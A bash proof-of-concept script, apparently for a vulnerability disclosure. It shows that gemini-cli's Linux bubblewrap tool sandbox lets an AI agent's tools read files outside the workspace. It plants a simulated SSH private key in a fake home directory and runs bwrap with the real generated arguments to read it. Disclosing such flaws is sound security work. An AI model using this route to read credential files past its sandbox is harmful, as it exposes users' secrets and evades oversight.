#!/usr/bin/env bash
# PoC: gemini-cli Linux "Tool sandboxing" (bwrap-based) does not confine file
# reads to the workspace, contradicting the project's own documentation and
# its own correctly-implemented macOS Seatbelt equivalent for the identical
# feature.
#
# Self-contained: clones the pinned commit fresh, installs real bubblewrap,
# generates the REAL, unmodified sandbox arguments via the actual
# buildBwrapArgs() export, and ACTUALLY EXECUTES bwrap with those exact
# arguments to read a file outside the sandboxed workspace.
set -euo pipefail

PINNED_COMMIT="9c1b0a610534d6f8120964cf2672c07807d8fc90"
WORK=$(mktemp -d)
echo "[*] Work dir: $WORK"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] Cloning google-gemini/gemini-cli at pinned commit $PINNED_COMMIT ..."
git clone -q https://github.com/google-gemini/gemini-cli.git "$WORK/gemini-cli"
git -C "$WORK/gemini-cli" checkout -q "$PINNED_COMMIT"

echo "[*] Installing workspace dependencies (needed to import the real TS modules) ..."
(cd "$WORK/gemini-cli" && npm install --legacy-peer-deps --silent > /dev/null 2>&1) || true

echo "[*] Installing bubblewrap (real sandbox binary) ..."
if ! command -v bwrap &> /dev/null; then
  sudo apt-get update -qq && sudo apt-get install -y -qq bubblewrap
fi
bwrap --version

echo "[*] Installing tsx ..."
npm install -g --silent tsx > /dev/null 2>&1 || true

echo ""
echo "############################################"
echo "# Step 1: verify the documented promise still reads the way it's quoted"
echo "############################################"
DOC_FILE="$WORK/gemini-cli/docs/cli/sandbox.md"
if grep -qF "By default, the sandbox only has access to the current project workspace" "$DOC_FILE"; then
  echo "  Confirmed: docs/cli/sandbox.md still states this exact promise."
else
  echo "  MISMATCH: the exact documented sentence was not found. PoC may be stale."
  exit 1
fi

echo ""
echo "############################################"
echo "# Step 2: generate REAL bwrap args via the real, unmodified buildBwrapArgs()"
echo "############################################"
# Use $HOME rather than a hardcoded path: writable whether running as root
# (local sandbox, $HOME=/root) or as an unprivileged CI user (GitHub
# Actions runners run as a non-root user, $HOME=/home/runner). Must NOT be
# under /tmp, since bwrap replaces /tmp with an empty tmpfs.
VICTIM_HOME="$HOME/gemini-vrp-poc-victim-home"
VICTIM_WORKSPACE="$HOME/gemini-vrp-poc-victim-workspace"
mkdir -p "$VICTIM_HOME/.ssh"
cat > "$VICTIM_HOME/.ssh/id_rsa" << 'KEYEOF'
-----BEGIN OPENSSH PRIVATE KEY-----
SIMULATED_REAL_SECRET_SSH_KEY
-----END OPENSSH PRIVATE KEY-----
KEYEOF
mkdir -p "$VICTIM_WORKSPACE/.git"
echo '{"name":"my-project"}' > "$VICTIM_WORKSPACE/package.json"

GEMINI_CLI_CHECKOUT="$WORK/gemini-cli" VICTIM_WORKSPACE="$VICTIM_WORKSPACE" npx --yes tsx "$SCRIPT_DIR/gen_args.mjs" > "$WORK/real_bwrap_args.json"
echo "  Real args generated:"
cat "$WORK/real_bwrap_args.json"

echo ""
echo "############################################"
echo "# Step 3: ACTUALLY EXECUTE bwrap with those exact real args"
echo "############################################"
VICTIM_HOME="$VICTIM_HOME" node "$SCRIPT_DIR/run_bwrap_test.mjs" "$WORK/real_bwrap_args.json"

echo ""
echo "############################################"
echo "# Step 4: source-level comparison against the real macOS implementation"
echo "############################################"
node "$SCRIPT_DIR/compare_macos_source.mjs" "$WORK/gemini-cli"

echo ""
echo "[*] Cleaning up $WORK"
rm -rf "$WORK" "$VICTIM_HOME" "$VICTIM_WORKSPACE"
